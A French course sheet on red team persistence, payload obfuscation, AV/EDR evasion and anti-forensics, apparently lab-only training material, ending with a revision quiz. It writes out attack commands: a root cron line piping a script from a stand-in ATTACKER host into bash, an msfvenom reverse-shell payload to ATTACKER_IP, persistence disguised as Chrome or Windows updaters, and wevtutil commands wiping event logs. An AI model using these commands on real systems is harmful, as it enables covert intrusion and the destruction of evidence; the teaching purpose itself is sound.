---
cssclasses:
  - max
aliases:
  - RED TEAM PERSISTENCE & EVASION
  - 01-20 | RED TEAM PERSISTENCE & EVASION
archetype: cour
module: "GEN (Culture Générale & Hors Cursus)"
tags:
  - red-teaming
  - persistance
  - evasion
  - opsec
  - attaque/ttps
  - evasion/av-edr
  - obfuscation/payload
  - detection/log
  - sysmon
  - etw
  - log/minimisation
  - evasion/uac
  - evasion/applocker
  - technique/persistance/linux/systemd
  - technique/persistance/linux/cron
  - technique/persistance/linux/ssh
  - technique/persistance/linux/ld-preload
  - technique/persistance/taches-planifiees
  - technique/persistance/windows/run-key
---

# 01-20 | RED TEAM PERSISTENCE & EVASION

> [!goal] Objectifs Pédagogiques
> À la fin de cette fiche, le participant doit être capable de :
> 1.  Mettre en place une **persistance discrète** sur des systèmes Linux et Windows.
> 2.  Comprendre et appliquer les principes de **contournement des solutions AV/EDR basiques** (en environnement de laboratoire).
> 3.  **Obfusquer un payload** pour réduire sa détectabilité.
> 4.  **Comprendre les mécanismes de détection** tels que les logs système, Sysmon et ETW (Event Tracing for Windows).
> 5.  **Éviter la génération de logs suspects** et minimiser le bruit système.
> 6.  **Échapper aux contrôles de sécurité** comme UAC (User Account Control) et Applocker.
> 7.  Assurer une **OPSEC minimale** (Operational Security) lors d'un pentest interne.

## 📝 Synthèse du Cours

Ce module avancé de Cyber Offensif encadré est conçu pour enseigner comment un attaquant réel maintient sa présence sur des systèmes compromis tout en restant invisible. L'objectif principal est d'améliorer les défenses en comprenant les tactiques, techniques et procédures (TTPs) utilisées par les Red Teams. Après avoir compromis des machines, la mission est de rester discret, persister, contourner les solutions de sécurité et éviter la détection. Ce module est strictement limité à un environnement de laboratoire à des fins pédagogiques et de compréhension défensive.

### 1. OPSEC (Operational Security) en Red Team

L'**OPSEC** est un ensemble de principes visant à protéger les opérations et les capacités des attaquants en réduisant leur empreinte et leur détectabilité. Il s'agit de minimiser tout "bruit" qui pourrait alerter les systèmes de défense ou les administrateurs.

> [!note] Définition Clé
> **OPSEC** : Ensemble de mesures et de pratiques destinées à protéger les opérations d'un attaquant contre la détection, en minimisant les traces et les comportements suspects.

Les principes fondamentaux de l'OPSEC en Red Team incluent :

*   **Limiter le bruit réseau** : Éviter les scans agressifs comme Nmap full scan. Préférer des techniques de scan passives telles que l'analyse ARP, NetBIOS ou les requêtes LDAP anonymes qui génèrent moins de trafic identifiable.
*   **Limiter le bruit disque** : Réduire au minimum les écritures sur disque. Éviter les gros payloads ou les fichiers temporaires inutiles qui pourraient laisser des artéfacts forensiques.
*   **Limiter le bruit système** : Ne pas créer de nouveaux services facilement visibles ou des méthodes de persistance trop évidentes qui seraient rapidement repérées par les équipes de défense.
*   **Limiter le bruit de logs** : Minimiser les événements Windows suspects, notamment les EventIDs 4624 (connexion réussie) et 4625 (échec de connexion), et les EventIDs Sysmon (comme 1, 3, 7, 11) qui indiquent des créations de processus, des connexions réseau ou des chargements de modules.

### 2. Techniques de Persistance

La persistance est la capacité d'un attaquant à maintenir son accès à un système compromis, même après un redémarrage ou une déconnexion de l'utilisateur. Les techniques varient selon le système d'exploitation.

#### 2.1 Persistance Linux (furtive)

Les méthodes de persistance sur Linux visent à exécuter du code malveillant au démarrage ou à intervalles réguliers.

*   **`systemd` (service root)** : Créer un service `systemd` personnalisé qui s'exécute au démarrage du système. Un exemple est un service "Updater" qui lance un script Python malveillant.
    ```
    [Unit]
    Description=Updater Service

    [Service]
    ExecStart=/usr/bin/python3 /etc/updater.py

    [Install]
    WantedBy=multi-user.target
    ```
    L'installation se fait en copiant le fichier de service dans `/etc/systemd/system/` et en l'activant avec `systemctl enable updater`.
*   **Cron job discret** : Ajouter une tâche `cron` qui s'exécute à des moments précis, comme au redémarrage (`@reboot`).
    ```bash
    echo "@reboot root /usr/bin/curl http://ATTACKER/shell.sh | bash" >> /etc/crontab
    ```
*   **Persistance SSH** : Ajouter une clé publique SSH de l'attaquant au fichier `~/.ssh/authorized_keys` de l'utilisateur cible (souvent root), permettant un accès sans mot de passe.
    ```bash
    mkdir /root/.ssh
    echo "clé_publique" >> /root/.ssh/authorized_keys
    ```
*   **`LD_PRELOAD` (furtif)** : Une technique avancée qui consiste à créer un fichier "intercepteur" dans `/etc/ld.so.preload`. Ce fichier spécifie une bibliothèque partagée à charger avant toutes les autres, permettant d'injecter des fonctions dans des processus existants.

#### 2.2 Persistance Windows

Sur les systèmes Windows, diverses techniques peuvent être employées pour maintenir un accès.

*   **Tâche planifiée (furtive)** : Créer une tâche planifiée qui s'exécute à un événement spécifique, par exemple à la connexion de l'utilisateur (`onlogon`).
    ```bash
    schtasks /create /tn "ChromeUpdater" /sc onlogon /tr "C:\ProgramData\chromeupdater.exe"
    ```
*   **Run key dans le registre** : Ajouter une entrée dans les clés de registre `Run` (par exemple, `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) pour qu'un programme se lance au démarrage de la session utilisateur.
    ```bash
    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v chrome /t REG_SZ /d "C:\ProgramData\chrome.exe"
    ```
*   **Service furtif** : Créer un nouveau service Windows avec la commande `sc create`. Il peut être configuré pour démarrer automatiquement.
    ```bash
    sc create WindowsUpdate binPath="C:\ProgramData\update.exe" start= auto
    ```
*   **WMI Event Subscription (furtif avancé)** : Utiliser WMI (Windows Management Instrumentation) pour créer une souscription à un événement, déclenchant l'exécution de code lorsque l'événement se produit (par exemple, à une heure spécifique ou lors d'une connexion utilisateur). Cette technique est plus complexe à détecter car elle est "fileless".
    ```powershell
    $Filter=Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
        Name="Updater";
        EventNamespace="root\cimv2";
        QueryLanguage="WQL";
        Query="SELECT * FROM Win32_LocalTime WHERE Minute=05";
    }
    ```
    Un *consumer* doit ensuite être associé au filtre.

### 3. Payload Furtifs et Obfuscation

Les payloads sont les charges utiles malveillantes qui sont exécutées sur la machine cible. Pour éviter la détection, ils doivent souvent être obfusqués ou chiffrés.

*   **Génération de Payload Windows basique (`msfvenom`)** : `msfvenom` est un outil de Metasploit permettant de générer des payloads personnalisés.
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o payload.exe
    ```
*   **Obfuscation PowerShell (`Invoke-Obfuscation`)** : Les scripts PowerShell sont souvent détectés. Des outils comme `Invoke-Obfuscation` peuvent modifier le code pour le rendre moins lisible et contourner les signatures.
*   **Encrypter un payload simple (`base64`)** : L'encodage Base64 est une méthode simple pour masquer un binaire. Le payload encodé peut être intégré dans un script et décodé à l'exécution.
    ```bash
    base64 -w0 payload.bin > payload.b64
    ```
    Le script PowerShell suivant permet de décoder et exécuter le payload :
    ```powershell
    $Bytes = [System.Convert]::FromBase64String("....")
    [System.IO.File]::WriteAllBytes("payload.exe", $Bytes)
    ```

### 4. Évasion des Défenses

L'évasion consiste à contourner les mécanismes de sécurité mis en place par les antivirus (AV) et les solutions de détection et réponse aux endpoints (EDR).

#### 4.1 Évasion AV Basique (principes)

L'évasion des antivirus traditionnels repose sur la modification du payload pour éviter les détections basées sur les signatures ou les heuristiques simples. Les concepts clés incluent :

*   **Changer la signature** : Recompiler le code, renommer les fonctions ou modifier la structure du binaire.
*   **Chiffrer le payload** : Utiliser un chiffrement simple (comme AES) pour le payload et le déchiffrer en mémoire au moment de l'exécution.
*   **Utiliser un stager HTTPS** : Préférer les communications chiffrées via HTTPS plutôt que HTTP pour le téléchargement du payload final, ce qui rend l'inspection du trafic plus difficile.
*   **Charger les données chiffrées en mémoire** : Éviter l'écriture du payload déchiffré sur le disque.
*   **Éviter les API suspectes** : Ne pas utiliser directement des fonctions API Windows connues pour être associées aux malwares (ex: `WinExec`, `CreateRemoteThread`).

#### 4.2 Évasion EDR (compréhension uniquement)

Les EDRs sont plus sophistiqués que les AVs, utilisant des analyses comportementales, des hooks API et des données de télémétrie. L'évasion EDR est un défi complexe et repose sur la compréhension de leurs mécanismes :

*   **Hooking API** : Les EDRs injectent souvent des DLLs dans les processus pour intercepter les appels système et API.
*   **ETW (Event Tracing for Windows)** : Un mécanisme de journalisation avancé que les EDRs utilisent pour collecter des informations détaillées sur l'activité du système.
*   **Inspection mémoire** : Analyse de la mémoire des processus à la recherche de code injecté ou de comportements anormaux.
*   **Sysmon events** : Collecte d'événements détaillés sur la création de processus, les connexions réseau, les modifications de fichiers, etc.
*   **Heuristiques comportementales** : Analyse des modèles de comportement suspects (ex: un processus Word lançant un processus PowerShell encodé).

Les contre-mesures (conceptuelles) pour l'évasion EDR incluent :

*   **Moins de processus parents/enfants suspects** : Éviter les chaînes de processus inhabituelles (ex: un navigateur lançant `cmd.exe`).
*   **Pas d'injection DLL abusive** : Minimiser l'injection de bibliothèques dynamiques dans d'autres processus.
*   **Utilisation discrète de PowerShell** : Éviter les scripts PowerShell trop longs ou flagrants, préférer des versions plus courtes ou des langages de programmation différents.
*   **Masquer le comportement stager → loader → beacon** : Dissimuler les étapes typiques d'une attaque (téléchargement initial, chargement en mémoire, communication avec le C2).

### 5. Anti-Forensics

L'anti-forensics consiste à masquer ou à éliminer les traces de l'activité de l'attaquant afin de compliquer l'analyse forensique et la détection.

*   **Nettoyage des logs Linux** : Supprimer les commandes de l'historique de la session (`~/.bash_history`, `history -c`). Cependant, dans un environnement défendu, cette action elle-même peut être détectée.
*   **Nettoyage Windows** : Effacer les journaux d'événements Windows (Système, Sécurité, Application) à l'aide de `wevtutil cl`.
    ```bash
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    ```
*   **Suppression des artéfacts** : Éliminer tous les fichiers laissés sur le système : payloads, binaires, fichiers temporaires, clés de registre créées.
*   **Contre-détection Sysmon** : Comprendre comment Sysmon enregistre les événements pour éviter de déclencher ses règles de détection (par exemple, en ne créant pas de nouveaux processus ou en ne modifiant pas de fichiers critiques de manière inattendue).

## 🧠 Carte Mentale / Schéma

```mermaid
graph TD
    A["Red Team Persistence & Evasion"]
    A --> B["1. OPSEC"]
    B --> B1("Limiter bruit réseau")
    B --> B2("Limiter bruit disque")
    B --> B3("Limiter bruit système")
    B --> B4("Limiter bruit logs")

    A --> C["2. Persistence Linux"]
    C --> C1("systemd service")
    C --> C2("Cron job")
    C --> C3("SSH authorized_keys")
    C --> C4("LD_PRELOAD")

    A --> D["3. Persistence Windows"]
    D --> D1("Tâche planifiée (schtasks)")
    D --> D2("Run Key Registre")
    D --> D3("Service furtif (sc create)")
    D --> D4("WMI Event Subscription")

    A --> E["4. Payloads Furtifs"]
    E --> E1("Génération (msfvenom)")
    E --> E2("Obfuscation (PowerShell)")
    E --> E3("Encrypter (Base64)")

    A --> F["5. Evasion AV Basique"]
    F --> F1("Changer signature")
    F --> F2("Chiffrer payload")
    F --> F3("Stager HTTPS")
    F --> F4("Données en mémoire")
    F --> F5("Pas d'API suspectes")

    A --> G["6. Evasion EDR (Compréhension)"]
    G --> G1("Hooking API")
    G --> G2("ETW")
    G3("Inspection mémoire")
    G4("Sysmon events")
    G5("Heuristiques comportementales")

    A --> H["7. Anti-Forensics"]
    H --> H1("Nettoyage Logs Linux")
    H --> H2("Nettoyage Logs Windows")
    H --> H3("Suppression Artefacts")
    H --> H4("Contre-détection Sysmon")
```


## ❓ Quiz de Révision (Active Recall)
> [!question] Question 1
> Quels sont les quatre principaux types de "bruit" qu'une équipe Red Team doit s'efforcer de limiter pour maintenir son OPSEC ?
> > [!success]- Réponse
> > Les quatre principaux types de bruit sont : le **bruit réseau**, le **bruit disque**, le **bruit système** et le **bruit de logs**.

> [!question] Question 2
> Citez deux méthodes de persistance furtive différentes pour un système Linux et deux pour un système Windows.
> > [!success]- Réponse
> > Pour Linux : `systemd` (service root), `cron job discret`, `SSH persistence` ou `LD_PRELOAD`.
> > Pour Windows : `Tâche planifiée (schtasks)`, `Run key dans le registre`, `Service furtif (sc create)` ou `WMI Event Subscription`.

> [!question] Question 3
> Expliquez pourquoi l'utilisation d'un stager HTTPS est préférée à HTTP pour un payload dans un scénario d'évasion AV.
> > [!success]- Réponse
> > L'utilisation d'un stager HTTPS est préférée car le trafic est chiffré, rendant l'inspection du contenu du payload plus difficile pour les solutions de sécurité réseau.

> [!question] Question 4
> Nommez deux mécanismes de détection avancés que les EDR utilisent et qu'une Red Team doit comprendre pour élaborer ses stratégies d'évasion.
> > [!success]- Réponse
> > Deux mécanismes de détection avancés utilisés par les EDR sont le **Hooking API**, l'**ETW (Event Tracing for Windows)**, l'**Inspection mémoire**, l'analyse des **événements Sysmon** ou les **heuristiques comportementales**.

> [!question] Question 5
> Quelle commande Windows peut être utilisée pour nettoyer les journaux d'événements Système, Sécurité et Application ?
> > [!success]- Réponse
> > La commande `wevtutil cl [NomDuJournal]` peut être utilisée, par exemple : `wevtutil cl System`, `wevtutil cl Security`, `wevtutil cl Application`.